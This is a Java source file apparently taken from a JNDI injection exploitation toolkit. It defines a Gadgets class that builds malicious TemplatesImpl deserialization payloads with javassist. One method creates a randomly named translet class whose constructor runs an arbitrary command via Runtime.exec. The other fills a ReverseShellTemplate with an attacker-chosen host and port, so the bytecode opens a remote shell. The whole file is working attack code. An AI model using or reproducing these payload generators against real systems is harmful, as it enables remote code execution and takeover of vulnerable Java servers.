package map.jndi.gadget;

import map.jndi.template.ReverseShellTemplate;
import map.jndi.util.MiscUtil;
import map.jndi.util.ReflectUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import javassist.bytecode.AccessFlag;
import javassist.bytecode.ClassFile;

public class Gadgets {

    public static TemplatesImpl createTemplatesImpl(String command) throws Exception {
        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();

        String body = String.format("java.lang.Runtime.getRuntime().exec(\"%s\");", command);

        ClassFile classFile = new ClassFile(false, MiscUtil.getRandStr(12), null);
        classFile.setMajorVersion(ClassFile.JAVA_8);
        classFile.setAccessFlags(AccessFlag.PUBLIC);
        CtClass clazz = pool.makeClass(classFile);

        CtClass superClazz = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        clazz.setSuperclass(superClazz);

        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setModifiers(Modifier.PUBLIC);
        constructor.setBody(body);
        clazz.addConstructor(constructor);

        ReflectUtil.setFieldValue(templatesImpl, "_name", "Hello");
        ReflectUtil.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
        ReflectUtil.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        return templatesImpl;
    }

    public static TemplatesImpl createTemplatesImpl(String host, int port) throws Exception {
        TemplatesImpl templatesImpl = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();

        CtClass clazz = pool.get(ReverseShellTemplate.class.getName());
        CtClass superClazz = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        clazz.setSuperclass(superClazz);

        ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
        ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(port));

        clazz.replaceClassName(clazz.getName(), MiscUtil.getRandStr(12));

        ReflectUtil.setFieldValue(templatesImpl, "_name", "Hello");
        ReflectUtil.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
        ReflectUtil.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        return templatesImpl;
    }
}
